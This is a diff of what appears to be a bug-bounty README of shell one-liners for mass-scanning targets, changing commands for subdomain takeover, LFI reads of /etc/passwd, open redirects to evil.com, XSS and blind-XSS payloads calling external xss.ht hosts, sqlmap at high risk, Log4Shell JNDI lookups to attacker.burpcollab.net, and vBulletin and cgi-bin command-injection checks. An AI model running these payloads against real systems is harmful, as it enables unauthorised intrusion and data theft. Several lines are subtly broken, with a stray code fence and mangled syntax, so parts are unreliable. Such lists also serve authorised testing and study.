@@ -6,6 +6,10 @@
 ![jst-1-line](https://user-images.githubusercontent.com/75373225/148362632-424b3936-6c95-41e8-b296-4e0931e40f1e.png)
 
 # Subdomain Enumeration
+**Juicy Subdomains**
+```
+subfinder -d target.com -silent | dnsprobe -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
+```
 **from BufferOver.run**
 ```
 curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u | tee subs.txt
@@ -37,13 +41,16 @@ curl -s "https://crt.sh/?q=%25.canva.com&output=json" | jq -r '.[].name_value' |
 --------
 ## Subdomain Takeover:
 ```
-cat subdomains.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
+cat subs.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
 ```
 ```
-subfinder -d target.com >> domains ; assetfinder -subs-only target.com >> domains ; amass enum -norecursive -noalts -d target.com >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
+subjack -w subs -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
 ```
 -------------------------------
 ## LFI:
+```
+cat hosts | gau |  gf lfi |  httpx  -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
+```
 ```
 waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
@@ -51,10 +58,7 @@ waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -
 cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n";done
 ```
 ```
-subfinder -d target.com | httpx -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"
-```
-```
-cat target.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt
+gau http://target.com | gf lfi | qsreplace "/etc/passwd" | httpx -t 250 -mr "root:x" 
 ```
 ----------------------
 ## Open Redirect:
@@ -63,6 +67,9 @@ waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while
 ```
 ```
 export LHOST="URL"; waybackurls $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
+```
+```
+cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
 ```
 -----------------------
 ## SSRF:
@@ -78,40 +85,34 @@ cat wayback.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf
 ----------------
 ## XSS:
 ```
-gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
+cat domains.txt | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
+```
+gau target.com grep '='| qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'
 ```
 ```
-echo "target.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
+```
+cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
+```
+```
+cat targets.txt | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
 ```
 ```
 waybackurls target.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 ```
 ```
-gospider -S target.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
-```
-```
-httpx -l urls.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
-```
-```
 cat urls.txt | grep "=" | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
 ```
 ```
-echo target.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
-```
-```
-cat targets.txt | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
+echo target.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq (freq or Airixss)
 ```
 ```
 cat targets.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
 ```
 ```
-subfinder target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters (or -header "X-Forwarded-For" )
-```
-```
 waybackurls target.com | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b hacker.xss.ht pipe > output.txt
 ```
 ```
-subfinder -d target.com | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
+cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
 ```
 ---------------------
 ## Hidden Dirs:
@@ -124,16 +125,17 @@ for URL in $(<targets.txt); do ( ffuf -u "${URL}/FUZZ" -w wordlists.txt -ac ); d
 ```
 ffuf -c -u target.com -H "Host: FUZZ" -w wordlist.txt 
 ```
+**Search for Sensitive files from Wayback**
 ```
-cat targets.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
+waybackurls domain.com| grep - -color -E "1.xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt"
+```
+```
+cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200
 ```
 -------------------
 ## SQLi:
 ```
-findomain -t http://target.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 5 --risk 3
-```
-```
-subfinder -d target.com | gau | grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
+cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 5 --risk 3
 ```
 ----------------
 ## CORS:
@@ -162,9 +164,6 @@ cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$h
 ```
 cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt
 ```
-```
-subfinder -d target.com -silent |puredns resolve -q |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://Yourburpcolab/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://Yourburpcolab/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://Yourburpcolab/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done
-```
 ### CVE-2022-0378:
 ```
 cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
@@ -175,24 +174,15 @@ cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/u
 ```
 ---------
 ## RCE:
+```
+cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 
+```
 ### vBulletin 5.6.2
 ```
 shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
 ```
 ```
 subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
-```
-### Java Deserialization RCE
-```
-for url in $(cat targets.txt); do python3 jexboss.py -u $url; print $url; done
-```
---------------
-## Sensitive Dirs:
-```
-curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | subfinder -d | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
-```
-```
-curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | subfinder -d | sed 's#$#/.env/#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
 ```
 -----------
 ## JS Files:
@@ -217,11 +207,6 @@ cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' |
 for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
 ```
 ---------------------------
-## Portscan without WAF
-```
-subfinder -silent -d target.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
-```
--------------------
 ## HeartBleed
 ```
 cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line; safe; done
@@ -230,6 +215,18 @@ cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $lin
 ## Scan IPs
 ```
 cat my_ips.txt | xargs -L100 shodan scan submit --wait 0
+```
+## Portscan
+```
+naabu -1 target.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -ports 1-65535 -silent -o out.txt
+```
+## Screenshots using Nuclei
+```
+nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
+```
+## IPs from CIDR
+```
+echo cidr | httpx -t 100 | nuclei -t ~/nuclei-templates/ssl/ssl-dns-names.yaml | cut -d " " -f7 | cut -d "]" -f1 |  sed 's/[//' | sed 's/,/\n/g' | sort -u 
 ```
 ---------------------
 ***More Scripts Coming Sooon :)***
